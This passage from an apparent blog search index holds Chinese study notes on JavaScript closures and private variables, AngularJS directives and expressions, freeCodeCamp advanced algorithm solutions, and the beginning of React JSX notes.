无论在什么地方，只要临时需要一些变量，就可以使用私有作用域。使用私有作用域如下： function outputNumbers(count) { (function() { for( var i = 0; i &lt; count; i++) { console.log(i); } })(); console.log(i);//导致一个错误！！！ } 这种技术经常在全局作用域中被用在函数外部，从而限制向全局作用域中添加过多的变量和函数。 私有变量严格来讲，JS中没有私有成员的概念，所有对象属性都是公有的。但有一个私有变量的概念，任何在函数中定义的变量，都可以认为是私有变量，因为在函数外部无法访问这些变量，包括函数参数、局部变量、在函数中定义的其他函数。 把有权访问上述私有变量和私有函数的公有方法称为特权方法，有两种在对象上创建特权方法的方式。 第一种：在构造函数中定义特权方法，基本模式如下 function MyObject() { //私有变量 var privateVariable = 10; //私有函数 function privateFunction() { return false; } //特权方法 this.publicMethod = function() { privateVariable++; return privateFunction(); }; } 能够在构造函数中定义特权方法，是因为特权方法作为闭包有权访问在构造函数中定义的所有变量和函数。 在创建构造函数实例后，除了使用特权方法，没有其他方式可以直接访问构造函数内部的私有变量和私有函数。 利用私有和特权成员，可以隐藏那些不应该被直接修改的数据。 在构造函数中定义特权方法的缺点，就是必须使用构造函数模式来实现特权方法，而构造函数的缺点是针对每个实例都会创建同样一组新方法，而使用静态私有变量来实现特权方法可以避免这一问题。 第二种：使用静态私有变量实现特权方法 通过在私有作用域中定义私有变量或函数，也可以创建特权方法。基本模式如下： (function() }{ //私有变量 var privateVariable = 10; //私有函数 function privateFunction() { return false; } //构造函数 MyObject = function() { }; //公有方法/特权方法 MyObject.prototype.publicMethod = function() { privateVariable++; return privateFunction(); }; })(); 公有方法是在构造函数原型上定义的，体现了典型的原型模式。注意：该模式在定义构造函数时并没有使用函数声明，而是使用了函数表达式。函数声明只能创建局部函数，并不是我们想要的，因此也没有使用关键字var声明MyObject。初始化未经声明的变量，总会创建一个全局变量，因此MyObject就变成了一个全局变量，能够在私有作用域之外被访问到。但在严格模式下，给未经声明的变量赋值会导致错误。 该模式与在构造函数中定义特权方法的主要区别在于，私有变量和函数由实例共享，在一个实例上调用公有方法，会影响所有实例。以该方式创建静态私有变量会因为使用原型而增进代码复用，但每个实例都没有自己的私有变量。因此选择使用实例变量，还是静态私有变量，视具体需求而定。 BOM-window对象BOM的核心对象是window，它表示浏览器的一个实例。在浏览器中，window对象既是通过JavaScript访问浏览器窗口的一个接口，又是ECMAScript规定的global对象。 全局作用域所有在全局作用域中声明的变量、函数都会变成window对象的属性和方法。例如： var age = 29; function sayAge() { alert(this.age); } alert(window.age); //29 sayAge(); //29 window.sayAge(); //29 全局变量会变为window对象的属性，定义全局变量与在window对象上直接定义属性的差别：全局变量不能通过delete操作符删除，而直接在window对象上定义的属性可以。 窗口关系及框架如果页面中包含框架，则每个框架都拥有自己的window对象，并且保存在frames集合中。]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AngularJS学习笔记01]]></title>
    <url>%2F2017%2F12%2F08%2FAngularJS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001-ing%2F</url>
    <content type="text"><![CDATA[AngularJS是Google开源的一款JavaScript MVC的前端框架，弥补了HTML在构建应用方面的不足，其通过使用指令（directives）结构来扩展HTML词汇，且通过表达式绑定数据到 HTML，使开发者可以使用HTML来声明动态内容，从而使得Web开发和测试工作变得更加容易。 AngularJS 是一个为动态WEB应用设计的结构框架，提供给大家一种新的开发应用方式，这种方式可以让你扩展HTML的语法，以弥补在构建动态WEB应用时静态文本的不足，从而在web应用程序中使用HTML声明动态内容。Angular可以帮助你组织JavaScript代码，可以创建响应式网站（会对用户的请求产生快速的反应），Angular可以和JQuery很好的协调、方便测试（搭建可维护的应用）。 简单的解释Angular就是一个可以给HTML加上互动性的客户端JS框架。 关于传统网页请求和AngularJS网页请求之间的区别，参见博客AngularJS系列——简介。 AngularJS简介AngularJS 通过 ng-directives 扩展了 HTML。 ng-app 指令定义一个 AngularJS 应用程序。 ng-model 指令把元素值（比如输入域的值）绑定到应用程序变量。 ng-bind 指令把应用程序数据绑定到 HTML 视图。 例如： &lt;body&gt; &lt;div ng-app=&quot;&quot;&gt; &lt;p&gt;名字 : &lt;input type=&quot;text&quot; ng-model=&quot;name&quot;&gt;&lt;/p&gt; &lt;h1&gt;Hello {{name}}&lt;/h1&gt; &lt;/div&gt; &lt;/body&gt; ng-app 指令告诉 AngularJS， 元素是 AngularJS 应用程序 的”所有者”。ng-model 指令把输入域的值绑定到应用程序变量 name。ng-bind 指令把应用程序变量 name 绑定到某个段落的 innerHTML。 AngularJS 使得开发现代的单一页面应用程序（SPAs：Single Page Applications）变得更加容易。 AngularJS 把应用程序数据绑定到 HTML 元素。 AngularJS 可以克隆和重复 HTML 元素。 AngularJS 可以隐藏和显示 HTML 元素。 AngularJS 可以在 HTML 元素&quot;背后&quot;添加代码。 AngularJS 支持输入验证。 表达式AngularJS 使用表达式把数据绑定到 HTML。 AngularJS 表达式写在双大括号内：。AngularJS表达式很像JavaScript表达式：它们可以包含文字、运算符和变量。 &lt;body&gt; &lt;div ng-app=&quot;&quot;&gt; &lt;p&gt;我的第一个表达式: {{ 5 + 5 }}&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; AngularJS 表达式把数据绑定到 HTML，这与 ng-bind 指令有异曲同工之妙。例如： &lt;div ng-app=&quot;&quot; ng-init=&quot;quantity=1;cost=5&quot;&gt; &lt;p&gt;总价： {{ quantity * cost }}&lt;/p&gt; &lt;/div&gt; 使用 ng-bind 的相同实例： &lt;div ng-app=&quot;&quot; ng-init=&quot;quantity=1;cost=5&quot;&gt; &lt;p&gt;总价： &lt;span ng-bind=&quot;quantity * cost&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; AngularJS表达式与JavaScript表达式比较 类似于 JavaScript 表达式，AngularJS 表达式可以包含字母，操作符，变量。 与 JavaScript 表达式不同，AngularJS 表达式可以写在 HTML 中。 与 JavaScript 表达式不同，AngularJS 表达式不支持条件判断，循环及异常。 与 JavaScript 表达式不同，AngularJS 表达式支持过滤器。 指令AngularJS 通过指令新属性来扩展 HTML，指令带有前缀 ng-。 AngularJS 通过内置的指令来为应用添加功能，允许自定义指令。 ng-app 指令初始化一个 AngularJS 应用程序。 ng-init 指令初始化应用程序数据。 ng-model 指令把元素值（比如输入域的值）绑定到应用程序。 ng-repeat 指令对于集合中（数组中）的每个项会 克隆一次 HTML 元素 例如： &lt;div ng-app=&quot;&quot; ng-init=&quot;firstName=&apos;John&apos;&quot;&gt; &lt;p&gt;在输入框中尝试输入：&lt;/p&gt; &lt;p&gt;姓名：&lt;input type=&quot;text&quot; ng-model=&quot;firstName&quot;&gt;&lt;/p&gt; &lt;p&gt;你输入的为： {{ firstName }}&lt;/p&gt; &lt;/div&gt; 使用 .directive 函数来添加自定义的指令。要调用自定义指令，HTML 元素上需要添加自定义指令名。使用驼峰法来命名一个指令， runoobDirective, 但在使用它时需要以 - 分割, runoob-directive。 &lt;body ng-app=&quot;myApp&quot;&gt; &lt;runoob-directive&gt;&lt;/runoob-directive&gt; &lt;script&gt; var app = angular.module(&quot;myApp&quot;, []); app.directive(&quot;runoobDirective&quot;, function() { return { template : &quot;&lt;h1&gt;自定义指令!&lt;/h1&gt;&quot; }; }); &lt;/script&gt; &lt;/body&gt; 你可以通过以下方式来调用指令：元素名、属性、类名、注释。 &lt;runoob-directive&gt;&lt;/runoob-directive&gt; &lt;div runoob-directive&gt;&lt;/div&gt; &lt;div class=&quot;runoob-directive&quot;&gt;&lt;/div&gt; &lt;!-- directive: runoob-directive --&gt; AngularJS模型 ng-model指令ng-model 指令用于绑定应用程序数据到 HTML 控制器(input, select, textarea)的值。ng-model 指令可以将输入域的值与 AngularJS 创建的变量绑定。]]></content>
      <categories>
        <category>Angular</category>
      </categories>
      <tags>
        <tag>Angular</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[freeCodeCamp JavaScript高级算法编程学习总结]]></title>
    <url>%2F2017%2F11%2F26%2FfreeCodeCamp-%E9%AB%98%E7%BA%A7%E7%AE%97%E6%B3%95%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[几个 freeCodeCamp JS高级算法编程例题的学习总结。 Validate US Telephone Numbers题目：如果传入字符串是一个有效的美国电话号码，则返回 true. 用户可以在表单中填入一个任意有效美国电话号码. 下面是一些有效号码的例子(还有下面测试时用到的一些变体写法): 555-555-5555 (555)555-5555 (555) 555-5555 555 555 5555 5555555555 1 555 555 5555 在本节中你会看见如 800-692-7753 or 8oo-six427676;laskdjf这样的字符串. 你的任务就是验证前面给出的字符串是否是有效的美国电话号码. 区号是必须有的. 如果字符串中给出了国家代码, 你必须验证其是 1. 如果号码有效就返回 true ; 否则返回 false. tips:RegExp 实现 function telephoneCheck(str) { //^1?表示以1开头，1匹配0次或1次 //\s?表示空白字符匹配0次或1次 //\d{3}匹配一个0-9的数字三次 //\(\d{3}\)匹配（一个0-9的数字三次），比上面多一个括号，左右括号分别需要加上转义字符\ //[ -]?表示空格或者连字符-匹配0次或1次 //\d{4}$表示已4位数字结尾($) var re=/^1?\s?(\d{3}|\(\d{3}\))[ -]?\d{3}[ -]?\d{4}$/; return re.test(str); } telephoneCheck(&quot;1 555)555-5555&quot;);//返回false Symmetric Difference题目：创建一个函数，接受两个或多个数组，返回所给数组的 对等差分(symmetric difference) (△ or ⊕)数组. 给出两个集合 (如集合 A = {1, 2, 3} 和集合 B = {2, 3, 4}), 而数学术语 “对等差分” 的集合就是指由所有只在两个集合其中之一的元素组成的集合(A △ B = C = {1, 4}). 对于传入的额外集合 (如 D = {2, 3}), 你应该安装前面原则求前两个集合的结果与新集合的对等差分集合 (C △ D = {1, 4} △ {2, 3} = {1, 2, 3, 4}). tips:Array.reduce() 实现 function sym(args) { //将多个参数合并为一个数组arr var arr = []; for(var i = 0; i &lt; arguments.length; i++) { arr.push(arguments[i]); } //也可以使用Array.from()将输入参数合并为一个数组 //var arr = Array.from(arguments); //temp为所有项都没同时出现在两个相邻数组的数组，但temp内部可能有重复元素，因为单个数组内部可能元素重复 //pre是前一个数组，cur是当前数组 var temp = arr.reduce(function(prev, cur, index) { //a数组由prev数组在cur中没有出现过的元素组成 var a = prev.filter(function(item) { return cur.indexOf(item) &lt; 0; }); //b数组由cur数组在prev中没有出现过的元素组成 var b = cur.filter(function(item){ return prev.indexOf(item) &lt; 0; }); //合并a和b作为新的prev return a.concat(b); }); //对temp去重 return temp.filter(function(item, index, array){ return array.indexOf(item) == index; }); } sym([1, 2, 3], [5, 2, 1, 4]); Exact Change题目：设计一个收银程序 checkCashRegister() ，其把购买价格(price)作为第一个参数 , 付款金额 (cash)作为第二个参数, 和收银机中零钱 (cid) 作为第三个参数. cid 是一个二维数组，存着当前可用的找零. 当收银机中的钱不够找零时返回字符串 “Insufficient Funds”. 如果正好则返回字符串 “Closed”.否则, 返回应找回的零钱列表,且由大到小存在二维数组中. tips:Global Object 思路：输入为商品价格，实际付款，收银机零钱的余额。然后返回值有三种，如果找不开返回”Insufficient Funds”；如果正好找开，收银机余额空了，返回”Closed”；其余则返回找零的数组。 先将美元的各面额存入数组，对面额数组由大到小遍历，如果待找零钱大于该面额且该面额在收银机中存在的话，则进行该面额的找零操作，否则进入下一面额的找零操作。本面额的找零操作过程为：先根据待找零钱计算出该面额需要的张数，如果待找零钱&gt;=该面额的总值，则将该面额的钱全部给出，然后待找零钱更新，将该面额的找零结果输出；如果待找零钱小于该面额的总值，则从该面额总值中给出需要找出的那几张，然后更新待找零钱，输出该面额的找零结果。 实现 function checkCashRegister(price, cash, cid) { var change = cash - price;//待找零钱数目 var denominationArr = [0.01, 0.05, 0.1, 0.25, 1, 5, 10, 20, 100];//将不同面额存入数组，对应于cid[i][0] var total = 0;//用来记录收银机总共的零钱数 var money = change;//将待找零钱数change备份，因为下面找零过程中会更新change var resultArr = [];//用来输出找零列表 //从大面额到小面额遍历 for(var i = cid.length - 1; i &gt;= 0; i--) { total += cid[i][1];//记录收银机的总钱数 //如果待找零钱大于等于某个面额，并且该面额的钱数大于0，则需要给出该面额的零钱 if(change &gt; denominationArr[i] &amp;&amp; cid[i][1] &gt; 0) {//denominationArr[i] 表示第i种面额钱的面值，cid[i][1]表示收银机中该面额的总额 //num表示需要给出的该面额的数量 var num = parseInt(change / denominationArr[i]); //如果change需要的第i种面额的钱数大于等于收银机中该面额的实际钱数，则将收银机中该面额的钱全部给出,更新change和resultArr if(denominationArr[i] * num &gt;= cid[i][1]) { change -= cid[i][1]; resultArr.push(cid[i]); } else { //否则change需要的第i种面额的钱小于收银机中该面额的实际钱数，则找出change需要的该面额数目，更新change和resultArr change -= denominationArr[i] * num; resultArr.push([cid[i][0], denominationArr[i] * num]); } //操作过程中会使得change变为一个无限小数，因此使用.toFixed(2)方法保留两位小数 change = change.toFixed(2);//四舍五入保留两位小数 } } //如果收银机中的总钱数正好等于待找零钱数，返回&quot;Closed&quot; if(total=== money) { return &quot;Closed&quot;; } //如果收银机中的总钱数不够找，或者不能正好找整即change不能最后更新到0，则返回&quot;Insufficient Funds&quot; else if(total &lt; money || (change-0) !== 0) { //使用(cahnge-0)将0.00转化为0 return &quot;Insufficient Funds&quot;; } return resultArr; } checkCashRegister(3.26, 100.00, [[&quot;PENNY&quot;, 1.01], [&quot;NICKEL&quot;, 2.05], [&quot;DIME&quot;, 3.10], [&quot;QUARTER&quot;, 4.25], [&quot;ONE&quot;, 90.00], [&quot;FIVE&quot;, 55.00], [&quot;TEN&quot;, 20.00], [&quot;TWENTY&quot;, 60.00], [&quot;ONE HUNDRED&quot;, 100.00]]); //返回[[&quot;TWENTY&quot;, 60.00], [&quot;TEN&quot;, 20.00], [&quot;FIVE&quot;, 15], [&quot;ONE&quot;, 1], [&quot;QUARTER&quot;, 0.50], [&quot;DIME&quot;, 0.20], [&quot;PENNY&quot;, 0.04]] 注意： js计算浮点数精度不准确容易导致一些小问题，老是有几个测试例子通不过，使用.toFixed(2)方法四舍五入保留两位小数，但该方法也不严谨。具体见博客关于js浮点数计算精度不准确问题的解决办法。 另外由于change = change.toFixed(2)，使得找零完毕后change=&quot;0.00&quot;，因此使用(cahnge-0)将0.00转化为0，否则使用严格不等change！==0是错误的，因为0.00和0不完全相等。当然若不使用 (change-0) !== 0，也可以使用不严格不等change != 0。 Inventory Update题目：依照一个存着新进货物的二维数组，更新存着现有库存(在 arr1 中)的二维数组. 如果货物已存在则更新数量 . 如果没有对应货物则把其加入到数组中，更新最新的数量. 返回当前的库存数组，且按货物名称的字母顺序排列. tips:Global Array Object 实现 function updateInventory(arr1, arr2) { //将现有库存的货物名称存入数组curGoodsArr var curGoodsArr = []; for(var i = 0; i &lt; arr1.length; i++) { curGoodsArr.push(arr1[i][1]); } for(var j = 0; j &lt; arr2.length; j++) { //若现有库存中没有新进货物类型，则将新货物名称和数量一并添加到库存数组，名称需按字母顺序排序 //将新货物名称追加到数组curGoodsArr,再对数组排序。sort()方法在原数组上排序，不生成副本 if(curGoodsArr.indexOf(arr2[j][1]) === -1) { //注意push()方法可向数组的末尾添加一个或多个元素，返回新的长度。注意是长度，不是返回新的数组！！！ curGoodsArr.push(arr2[j][1]); //给货物名称按字母排序 curGoodsArr.sort(); //找到该新货物名称在排序后出现在curGoodsArr数组中的索引，该索引值也是新货物应该出现在库存数组中的顺序 var indexNewGoods = curGoodsArr.indexOf(arr2[j][1]); //将新货物名称和数量一并插入到库存数组,使用.splice()方法,该方法会改变原始数组 arr1.splice(indexNewGoods, 0, [arr2[j][0], arr2[j][1]]); } //如果现有库存货物中已经新进货物的类型，则更新库存数量 else { //index为已有货物在库存货物名称数组中的索引，也即货物在库存数组中出现的顺序 var index = curGoodsArr.indexOf(arr2[j][1]); //更新库存数量，即等于原来的库存数量+新进的数量 arr1[index][0] =arr1[index][0] + arr2[j][0]; } } return arr1; } // 仓库库存示例 var curInv = [ [21, &quot;Bowling Ball&quot;], [2, &quot;Dirty Sock&quot;], [1, &quot;Hair Pin&quot;], [5, &quot;Microphone&quot;] ]; var newInv = [ [2, &quot;Hair Pin&quot;], [3, &quot;Half-Eaten Apple&quot;], [67, &quot;Bowling Ball&quot;], [7, &quot;Toothpaste&quot;] ]; updateInventory(curInv, newInv);//返回[[88, &quot;Bowling Ball&quot;], [2, &quot;Dirty Sock&quot;], [3, &quot;Hair Pin&quot;], [3, &quot;Half-Eaten Apple&quot;], [5, &quot;Microphone&quot;], [7, &quot;Toothpaste&quot;]] No repeats please题目：把一个字符串中的字符重新排列生成新的字符串，返回新生成的字符串里没有连续重复字符的字符串个数.连续重复只以单个字符为准。 例如, aab 应该返回 2 因为它总共有6中排列 (aab, aab, aba, aba, baa, baa), 但是只有两个 (aba and aba)没有连续重复的字符 (在本例中是 a). 考察全排列 tips:Permutations RegExp 全排列算法原理和实现 实现 //求一个字符串的全排列字符串中，不含连续重复字符的字符串个数 function permAlone(str) { //将输入字符串转化为数组 strArr = str.split(&quot;&quot;); //求该字符串数组的全排列形式 permResultArr = []; perm(strArr, 0, strArr.length-1); //找出全排列后非连续重复的字符串个数 var count = 0; for(var i = 0; i &lt; permResultArr.length; i++) { if(conRepCharacter(permResultArr[i])) { count += 1; } } return count; } //判断一个字符串是否含连续重复的字符，若不包含连续重复字符，则返回true function conRepCharacter(str) { if(str.length === 1) { return true; } for(var i = 0; i &lt; str.length-1; i++) { if(str[i+1] === str[i]) { return false; } } return true; } //交换数组中两个字符的位置 function swapCharacter(arr, i, j) { var temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; return arr; } //求给定字符串数组的全排列,其中strArr表示输入字符串转化成的数组，flag表示递归到哪一位，end表示递归结束的位即字符串长度减1 function perm(strArr, flag, end) { //递归结束输出结果 if(flag === end) { permResultArr.push(strArr.join(&quot;&quot;)); } for(var i = flag; i &lt;= end; i++) { //将字符串中的所有字母分别与第一个字母交换 strArr = swapCharacter(strArr, flag, i); //对交换后的字符串继续递归排列，由于第一个字母已经排列，因此从一个字母开始排列，即flag+1 perm(strArr, flag+1, end); //由于在进入到下一次循环时序列是被改变了，可如果要假定第一个字母的所有可能性的话，必须是建立在这些序列的初始状态一致的情况下 //因此通过再次交换恢复之前的排列顺序 strArr = swapCharacter(strArr, flag, i); } return permResultArr; } permAlone(&quot;abc&quot;);//返回6 Friendly Date Ranges题目：把常见的日期格式如：YYYY-MM-DD 转换成一种更易读的格式。易读格式应该是用月份名称代替月份数字，用序数词代替数字来表示天 (1st 代替 1). 如果一个日期区间里结束日期与开始日期相差小于一年，则结束日期就不用写年份了；在这种情况下，如果月份开始和结束日期如果在同一个月，则结束日期月份也不用写了。另外, 如果开始日期年份是当前年份，且结束日期与开始日期小于一年，则开始日期的年份也不用写。 例如:包含当前年份和相同月份的时候，makeFriendlyDates([“2017-01-02”, “2017-01-05”]) 应该返回 [“January 2nd”,”5th”]。不包含当前年份，makeFriendlyDates([“2003-08-15”, “2009-09-21”]) 应该返回 [“August 15th, 2003”, “September 21st, 2009”]。 考虑清楚所有可能出现的情况，包括传入的日期区间是否合理。对于不合理的日期区间，直接返回 undefined 即可。 tips:String.split() String.substr() parseInt() 实现 function makeFriendlyDates(arr) { var resultArr = []; //开始日期数组 var startArr = arr[0].split(&quot;-&quot;); //结束日期数组 var endArr = arr[1].split(&quot;-&quot;); //开始日期的年月日 var sYear = parseInt(startArr[0], 10); var sMonth = parseInt(startArr[1], 10); var sDay = parseInt(startArr[2], 10); //结束日期的年月日 var eYear = parseInt(endArr[0], 10); var eMonth = parseInt(endArr[1], 10); var eDay = parseInt(endArr[2], 10); //开始日期与结束日期之间相差的天数 var distDays = (eYear-sYear)*365 + (eMonth-sMonth)*30 + eDay-sDay; //获取当前日期的年份 var currDate = new Date(); var currYear = currDate.getFullYear(); //月份字符串数组 var monthsArr = [&quot;January&quot;,&quot;February&quot;,&quot;March&quot;,&quot;April&quot;,&quot;May&quot;,&quot;June&quot;,&quot;July&quot;,&quot;August&quot;,&quot;September&quot;,&quot;October&quot;,&quot;November&quot;,&quot;December&quot;]; //日字符串数组 var daysArr = [&quot;1st&quot;,&quot;2nd&quot;,&quot;3rd&quot;,&quot;4th&quot;,&quot;5th&quot;,&quot;6th&quot;,&quot;7th&quot;,&quot;8th&quot;,&quot;9th&quot;,&quot;10th&quot;,&quot;11th&quot;,&quot;12th&quot;,&quot;13th&quot;,&quot;14th&quot;,&quot;15th&quot;,&quot;16th&quot;,&quot;17th&quot;,&quot;18th&quot;,&quot;19th&quot;,&quot;20th&quot;,&quot;21st&quot;,&quot;22nd&quot;,&quot;23rd&quot;,&quot;24th&quot;,&quot;25th&quot;,&quot;26th&quot;,&quot;27th&quot;,&quot;28th&quot;,&quot;29th&quot;,&quot;30th&quot;,&quot;31st&quot;]; //先判断日期区间是否合理,若不合理返回undefined if(distDays &lt; 0) { return &quot;undefined&quot;; } //如果开始日期和结束日期一样，则返回一个 if(sYear === eYear &amp;&amp; sMonth === eMonth &amp;&amp; sDay === eDay) { resultArr = [monthsArr[sMonth-1] + &quot; &quot; + daysArr[sDay-1] + &quot;, &quot; + sYear]; return resultArr; } //如果开始日期年份是当前年份,结束日期与开始日期相差小于一年，月份开始和结束日期如果在同一个月，则开始日期年份、结束日期年份和月份也不用写了 if(currYear === sYear &amp;&amp; distDays &lt; 365 &amp;&amp; sMonth === eMonth) { resultArr = [monthsArr[sMonth-1] + &quot; &quot;+ daysArr[sDay-1], daysArr[eDay-1]]; return resultArr; } //如果开始日期年份是当前年份,结束日期与开始日期相差小于一年，月份开始和结束日期不在同一个月,则开始日期年份、结束日期年份不用写了 if(currYear === sYear &amp;&amp; distDays &lt; 365 &amp;&amp; sMonth !== eMonth) { resultArr = [monthsArr[sMonth-1] + &quot; &quot; + daysArr[sDay-1], monthsArr[eMonth-1] + &quot; &quot; + daysArr[eDay-1]]; return resultArr; } //如果开始日期年份不是当前年份,结束日期与开始日期相差小于一年，月份开始和结束日期在同一个月,则结束日期年份和月份不用写了 if(currYear !== sYear &amp;&amp; distDays &lt; 365 &amp;&amp; sYear === eYear &amp;&amp; sMonth === eMonth) { resultArr = [monthsArr[sMonth-1] + &quot; &quot; + daysArr[sDay-1] + &quot;, &quot; + sYear, daysArr[eDay-1]]; return resultArr; } //如果开始日期年份不是当前年份,结束日期与开始日期相差小于一年，月份开始和结束日期不在同一个月,则结束日期年份不用写了 if(currYear !== sYear &amp;&amp; distDays &lt; 365 &amp;&amp; sYear !== eYear &amp;&amp; distDays &gt; 30) { resultArr = [monthsArr[sMonth-1] + &quot; &quot; + daysArr[sDay-1] + &quot;, &quot; + sYear, monthsArr[eMonth-1] + &quot; &quot; + daysArr[eDay-1]]; return resultArr; } //如果开始日期年份不是当前年份,结束日期与开始日期相差大于等于一年 if(distDays &gt;= 365) { resultArr = [monthsArr[sMonth-1] + &quot; &quot; + daysArr[sDay-1] + &quot;, &quot; + sYear, monthsArr[eMonth-1] + &quot; &quot; + daysArr[eDay-1] + &quot;, &quot; + eYear]; return resultArr; } } makeFriendlyDates([&quot;2001-12-20&quot;, &quot;2001-12-20&quot;]);//返回[&quot;December 20th, 2001&quot;] Make a Person题目：用下面给定的方法构造一个对象. 方法有 getFirstName(), getLastName(), getFullName(), setFirstName(first), setLastName(last), and setFullName(firstAndLast). 所有有参数的方法只接受一个字符串参数.所有的方法只与实体对象交互. tips:Closures Details of the Object Model 实现 var Person = function(firstAndLast) { this.getFirstName = function() { var arr = firstAndLast.split(&quot; &quot;); return arr[0]; }; this.getLastName = function() { var arr = firstAndLast.split(&quot; &quot;); return arr[1]; }; this.getFullName = function() { return firstAndLast; }; this.setFirstName = function(first) { var arr = firstAndLast.split(&quot; &quot;); arr[0] = first; firstAndLast = arr.join(&quot; &quot;); }; this.setLastName = function(last) { var arr = firstAndLast.split(&quot; &quot;); arr[1] = last; firstAndLast = arr.join(&quot; &quot;); }; this.setFullName = function(firstAndLast2) { firstAndLast = firstAndLast2; }; }; var bob = new Person(&apos;Bob Ross&apos;); bob.getFirstName();//返回&quot;Bob&quot; Map the Debris题目：返回一个数组，其内容是把原数组中对应元素的平均海拔转换成其对应的轨道周期.原数组中会包含格式化的对象内容，像这样 {name: ‘name’, avgAlt: avgAlt}. 求得的值应该是一个与其最接近的整数，轨道是以地球为基准的. 地球半径是 6367.4447 kilometers, 地球的GM值是 398600.4418, 圆周率为Math.PI tips:Math.pow() Math.round() 实现 function orbitalPeriod(arr) { var GM = 398600.4418; var earthRadius = 6367.4447; //轨道周期公式 T=2π√(a^3/GM) for(var i = 0; i &lt; arr.length; i++) { //a为轨道半径，等于地球半径加平均海拔 var a = earthRadius + arr[i].avgAlt; var T1 = Math.sqrt(4 * Math.pow(Math.PI, 2) * Math.pow(a, 3) / GM); //将求得的周期转化为整数 var T = Math.round(T1); //删除原有属性海拔 delete arr[i].avgAlt; //添加新的属性轨道周期 arr[i].orbitalPeriod = T; } return arr; } orbitalPeriod([{name : &quot;sputnik&quot;, avgAlt : 35873.5553}]);//返回[{name: &quot;sputnik&quot;, orbitalPeriod: 86400}] Pairwise题目：举个例子：有一个能力数组[7,9,11,13,15]，按照最佳组合值为20来计算，只有7+13和9+11两种组合。而7在数组的索引为0，13在数组的索引为3，9在数组的索引为1，11在数组的索引为2。 所以我们说函数：pairwise([7,9,11,13,15],20) 的返回值应该是0+3+1+2的和，即6。 tips:Array.reduce()自己没有用上reduce()方法 实现 function pairwise(arr, arg) { var sumIndex = 0; for(var i = 0; i &lt; arr.length; i++) { //与当前元素应该配对的元素值 var pairVal = arg - arr[i]; //配对元素应有的索引值,配对元素不能为自己 var pairIndex = arr.indexOf(pairVal); //如果找到与当前元素配对的，则将这一对的索引值累加，并将当前元素和与之配对的元素值置为-1 if(pairIndex !== -1 &amp;&amp; pairIndex !== i) { arr[i] = -1; arr[pairIndex] = -1; sumIndex += i + pairIndex; } } return sumIndex; } pairwise([1, 3, 2, 4], 4);//返回1]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React-demos学习笔记【from阮】]]></title>
    <url>%2F2017%2F11%2F20%2Freact-demos%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[来自阮一峰的博客React 入门实例教程学习。 JSX语法简介React的核心机制之一就是可以在内存中创建虚拟的DOM元素。React利用虚拟DOM来减少对实际DOM的操作从而提升性能。 JSX 就是Javascript和XML结合的一种格式。React发明了JSX，利用HTML语法来创建虚拟DOM。当遇到 &lt;，JSX就当HTML解析，遇到 { 就当JavaScript解析。 JS语法 var child1 = React.createElement(&apos;li&apos;, null, &apos;First Text Content&apos;); var child2 = React.createElement(&apos;li&apos;, null, &apos;Second Text Content&apos;); var root = React.createElement(&apos;ul&apos;, { className: &apos;my-list&apos; }, child1, child2); JSX语法 var root =( &lt;ul className=&quot;my-list&quot;&gt; &lt;li&gt;First Text Content&lt;/li&gt; &lt;li&gt;Second Text Content&lt;/li&gt; &lt;/ul&gt; ); JSX将XML语法直接加入JS中,通过代码而非模板来高效的定义界面。之后JSX通过翻译器转换为纯JS再由浏览器执行。在实际开发中，JSX在产品打包阶段都已经编译成纯JavaScript，JSX的语法不会带来任何性能影响。 另外，由于JSX只是一种语法，因此JavaScript的关键字class, for等也不能出现在XML中，而要如例子中所示，使用className, htmlFor代替，这和原生DOM在JavaScript中的创建也是一致的。JSX只是创建虚拟DOM的一种语法格式而已,除了用JSX,我们也可以用JS代码来创建虚拟DOM. 一篇简要介绍JSX语法的文章深入浅出React（三）：理解JSX和组件。 HTML模板使用 React 的网页源码，结构大致如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;script src=&quot;../build/react.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../build/react-dom.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../build/browser.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;example&quot;&gt;&lt;/div&gt; &lt;script type=&quot;text/babel&quot;&gt; // starts here &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 最后一个 标签的 type 属性为 text/babel ,因为 React 独有的 JSX 语法，跟 JavaScript 不兼容。凡是使用 JSX 的地方，都要加上 type=”text/babel”。 上面代码一共用了三个库： react.js 、react-dom.js 和 Browser.js ，它们必须首先加载。其中，react.js 是 React 的核心库，react-dom.js 是提供与 DOM 相关的功能，Browser.js 的作用是将 JSX 语法转为 JavaScript 语法，这一步很消耗时间，实际上线的时候，应该将它放到服务器完成。 ReactDOM.render()React最基本的方法，用于将模板转为 HTML 语言，并插入到指定的 DOM 节点。 ReactDOM.render( &lt;h1&gt;Hello, world!&lt;/h1&gt;, document.getElementById(&apos;example&apos;) ); 上面代码将一个 h1 标题，插入到 example 节点。代码执行结果如下： &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;script src=&quot;../build/react.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../build/react-dom.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../build/browser.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;example&quot;&gt; &lt;h1 data-reactroot=&quot;&quot;&gt;Hello, world!&lt;/h1&gt; &lt;/div&gt; &lt;script type=&quot;text/babel&quot;&gt; ReactDOM.render( &lt;h1&gt;Hello, world!&lt;/h1&gt;, document.getElementById(&apos;example&apos;) ); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; JSX语法HTML 语言直接写在 JavaScript 语言之中，不加任何引号，这就是 JSX 的语法，它允许 HTML 与 JavaScript 的混写。 &lt;body&gt; &lt;div 